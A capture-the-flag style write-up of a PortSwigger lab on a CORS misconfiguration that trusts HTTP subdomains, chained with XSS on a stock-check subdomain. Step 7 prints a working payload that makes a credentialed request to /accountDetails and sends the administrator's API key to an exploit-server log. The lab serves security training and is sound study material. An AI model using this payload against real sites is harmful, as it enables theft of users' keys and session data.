# CORS - vulnerability with trusted insecure protocols 

## 📌 Lab Details
- **Title**: CORS vulnerability with trusted insecure protocols
- **Difficulty**: Practitioner
- **Category**: Cross-Origin Resource Sharing
- **Lab URL**: https://portswigger.net/academy/labs/launch/c2f3d400e6fb00bebe61e8dca6a98b25a66613b18da83b2279298634c46d7f8e?referrer=%2fweb-security%2fcors%2flab-breaking-https-attack

## 🔍 Summary
This lab exploited **insecure CORS trusting all subdomains regardless of protocol (HTTP/HTTPS)** combined with **XSS in an HTTP subdomain**. Using **XSS on the HTTP subdomain**, you executed JavaScript to send a **credentialed** `XMLHttpRequest` **over HTTPS**, retrieving the **administrator’s API key** via CORS.

## 🛠 Steps to Solve
1. Use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to **Burp Repeater** and resubmit it with the added header: `Origin:http://subdomain.lab-id.com`.
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
5. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain.
6. Observe that the `productID` parameter is vulnerable to XSS.
7. Inject the payload on the **Exploit** server:
   ```sh
   <script>
   document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
   <script> var req= new XMLHttpRequest();
   req.onload=reqListener();
   req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
   req.withCredentials=true;
   req.send();
   function reqListener() {
   location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };
   %3c/script>&storeId=1"
   </script>
  8. Deliver the exploit to the victim and access the log to find the `API` key.

## 📖 Key Takeaways
- CORS misconfigurations can be exploited using **mixed content (HTTP subdomain + HTTPS target)**.
- **XSS on an HTTP subdomain** is leveraged to bypass Same-Origin Policy and steal sensitive data via insecure CORS.
- Servers should **strictly validate origins, enforce HTTPS everywhere**, and sanitize user inputs to prevent XSS.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e6f52a23-41a8-46db-91dc-2d028c7d9658" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2f8189c8-51fb-470f-afc1-fc51f33ee2c5" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/65371f7c-f930-4322-a943-7cf0788c91b7" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/529e0f55-213a-4777-9ee8-f4ffe8bd3ff5" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/34742e6b-55a8-451b-91cf-f9f272232e71" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/152076e9-f655-4cd8-aa15-e59d75b2774f" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9d3aa196-3e9d-4c86-99a0-56798143b1e6" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/41f5cf7d-1ea5-49e2-908f-9471614c6f5d" />
